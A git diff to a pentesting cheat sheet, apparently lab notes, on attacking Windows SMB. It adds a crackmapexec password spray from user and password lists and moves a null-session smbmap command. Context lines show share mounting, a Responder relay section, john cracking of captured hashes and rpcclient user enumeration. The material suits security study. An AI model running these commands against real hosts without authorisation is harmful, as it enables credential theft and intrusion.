@@ -9,13 +9,7 @@
 - 1433 ms-sql
 - 5985-5986 WinRM
 
-> [!] NOTE: NetBIOS session service facilitates authentication aross a windows workgroup or domain and provides access to resources (such as files and printers) 
-
-## Map SAMBA exposed shared resources with smbmap {-}
-
-```bash
-smbmap -H 10.10.10.10 -u " " -p " "
-```
+> [!] NOTE: NetBIOS session service facilitates authentication aross a windows workgroup or domain and provides access to resources (such as files and printers)
 
 ## SMB connection with smbclient and smbmap {-}
 
@@ -31,6 +25,7 @@ specify the Null session by using the `-u 'null'` argument
 
 ```bash
 smbmap -H 10.10.10.10 -u 'null'
+smbmap -H 10.10.10.10 -u " " -p " "
 ```
 
 As soon as you find a resource that you can access, you can use **smbclient** to connect to it. Again you can use the `-N` argument to tell
@@ -50,7 +45,7 @@ mount -t cifs "//10.10.10.10/<Accessible resource>" /mnt/smbvictim
 ```
 
 > [!] NOTE: A mounted partition is not a download of victim folders and file. That's only an access pass. Type `unmount /mnt/smbmounted` to close the
-> mounted share. 
+> mounted share.
 
 One interesting point with smb is that there is some specified rights at the smb level that can varied. That means that it's not because the
 shared resource is on READ ONLY mode that all the folders that this resource contains can not have a write right. You can check if some repository of 
@@ -59,6 +54,7 @@ this resource are writable with the **smbcacls** tool. The interesting right tha
 ```bash
 smbcacls "10.10.10.10/<Accessible resource>" Users/amanda -N
 ```
+
 The output will look as following:
 
 ```{r, echo = FALSE, fig.cap="smbcacls read right", out.width="90%"}
@@ -99,6 +95,12 @@ return a red plus sign and you will see a (Pwn3d!) in the result.
 cme smb 10.10.10.10 -u 'user' -p 'password1'
 ```
 
+You can also check the validity of multiple users with some discovered passwords
+
+```bash
+cme smb 10.10.10.10 -u users.txt -p passwords.txt
+```
+
 ## Sniffing traffic for SAMBA Relay with responder {-}
 
 When SAMBA is created, by default SAMBA cert is not signed. That means that by default it's not possible to validate the origin legitimity. 
@@ -120,6 +122,7 @@ What attacker can do with this hash?
 
 1. copy hashes in a file (*hashes*)
 1. bruteforce hashes file with john
+
     ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt hashes
     ```
@@ -151,8 +154,6 @@ rpcclient -U "user%password" 10.10.10.10 -c 'enumdomgroups'
 rpcclient -U "user%password" 10.10.10.10 -c 'querygroupmem 0x200'
 # get the rid of the users -> 0x1f4 for example
 rpcclient -U "user%password" 10.10.10.10 -c 'queryuser 0x1f4'
-
-
 ```
 
 ## Enumerate ldap service with nmap {-}
